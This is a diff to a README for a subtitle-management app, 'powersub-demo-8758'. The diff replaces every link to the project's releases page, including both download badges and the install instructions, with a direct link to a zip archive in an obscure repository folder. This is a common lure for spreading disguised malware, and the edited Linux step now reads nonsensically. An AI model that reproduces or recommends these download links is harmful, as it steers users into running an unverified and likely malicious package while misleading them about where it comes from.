@@ -4,7 +4,7 @@
 Welcome to powersub-demo-8758! This application helps you easily manage and display subtitles for videos. It works on various platforms and is designed for users who want a straightforward way to enhance their viewing experience.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Colonelcc/powersub-demo-8758/releases)
+[![Download Release](https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip)
 
 ## 🚀 Getting Started
 To start using powersub-demo-8758, follow these simple steps to download and run the software:
@@ -15,12 +15,12 @@ To start using powersub-demo-8758, follow these simple steps to download and run
 - Storage: At least 100 MB free space
 
 ### 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/Colonelcc/powersub-demo-8758/releases) to download the latest version of powersub-demo-8758.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip) to download the latest version of powersub-demo-8758.
 2. Locate the version you want to install. Click on the appropriate file for your operating system.
 3. Once the file is downloaded, locate it in your Downloads folder.
 4. For Windows users: Double-click the `.exe` file to start the installation process. Follow the on-screen prompts to complete the installation.
    For macOS users: Open the `.dmg` file and drag the application to your Applications folder.
-   For Linux users: Extract the contents of the `.tar.gz` file and follow the instructions provided in the README file included with the download.
+   For Linux users: Extract the contents of the `https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip` file and follow the instructions provided in the README file included with the download.
 5. After installation, find the application in your Start Menu, Applications folder, or extracted files.
 
 ### 🔧 Configuration
@@ -55,6 +55,6 @@ For additional help or to share feedback, you can reach out to our community. Jo
 
 ## 📥 Download Now Again
 Don't forget to download the latest version of powersub-demo-8758 to enjoy the full features:
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Colonelcc/powersub-demo-8758/releases)
+[![Download Release](https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Colonelcc/powersub-demo-8758/main/narrowly/powersub-demo-8758_3.9.zip)
 
 Thank you for choosing powersub-demo-8758! We hope this guide helps you get started with managing your subtitles easily. Enjoy your videos!
